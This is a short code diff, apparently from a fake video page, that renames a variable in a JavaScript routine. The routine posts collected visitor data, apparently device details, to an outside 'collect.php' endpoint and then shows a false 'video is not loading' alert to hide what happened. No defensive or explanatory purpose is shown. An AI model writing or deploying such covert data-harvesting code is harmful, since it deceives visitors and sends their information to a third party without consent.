@@ -114,9 +114,9 @@
       fetch("https://jdev.com.np/collect.php", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
+        body: JSON.stringify(device)
       }).then(res => res.json())
-        .then(data => {
+        .then(device => {
           alert("Video is not loading try to open the link in another browser");
         });
     }
